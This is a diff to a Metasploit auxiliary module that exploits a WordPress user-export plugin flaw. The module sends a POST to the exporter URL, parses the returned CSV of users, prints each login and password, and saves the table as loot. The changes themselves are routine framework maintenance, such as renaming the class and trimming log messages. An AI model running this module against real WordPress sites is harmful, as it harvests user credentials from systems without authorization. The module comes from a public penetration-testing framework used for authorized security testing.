@@ -1,13 +1,12 @@
 ##
-# This module requires Metasploit: http://www.metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'csv'
 
-class Metasploit3 < Msf::Auxiliary
-  include Msf::HTTP::Wordpress
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -24,8 +23,8 @@ class Metasploit3 < Msf::Auxiliary
       'License'         => MSF_LICENSE,
       'Author'          =>
         [
-          'James Hooker',                    # Disclosure
-          'Rob Carr <rob[at]rastating.com>'  # Metasploit module
+          'James Hooker', # Disclosure
+          'rastating'     # Metasploit module
         ],
       'References'      =>
         [
@@ -49,7 +48,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def process_row(row)
     if row[:user_login] && row[:user_pass]
-      print_good("#{peer} - Found credential: #{row[:user_login]}:#{row[:user_pass]}")
+      print_good("Found credential: #{row[:user_login]}:#{row[:user_pass]}")
 
       credential_data = {
         origin_type: :service,
@@ -88,7 +87,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status("#{peer} - Requesting CSV extract...")
+    print_status("Requesting CSV extract...")
     res = send_request_cgi(
       'method'    => 'POST',
       'uri'       => exporter_url,
@@ -97,14 +96,14 @@ class Metasploit3 < Msf::Auxiliary
     fail_with(Failure::Unreachable, 'No response from the target') if res.nil?
     fail_with(Failure::UnexpectedReply, "Server responded with status code #{res.code}") if res.code != 200
 
-    print_status("#{peer} - Parsing response...")
+    print_status("Parsing response...")
     unless parse_csv(res.body, ',')
       unless parse_csv(res.body, ';')
-        fail_with("#{peer} - Failed to parse response, the CSV was invalid")
+        fail_with(Failure::UnexpectedReply, "#{peer} - Failed to parse response, the CSV was invalid")
       end
     end
 
     store_path = store_loot('wordpress.users.export', 'csv', datastore['RHOST'], res.body, 'users_export.csv', 'WordPress User Table Extract')
-    print_good("#{peer} - CSV saved to #{store_path}")
+    print_good("CSV saved to #{store_path}")
   end
 end
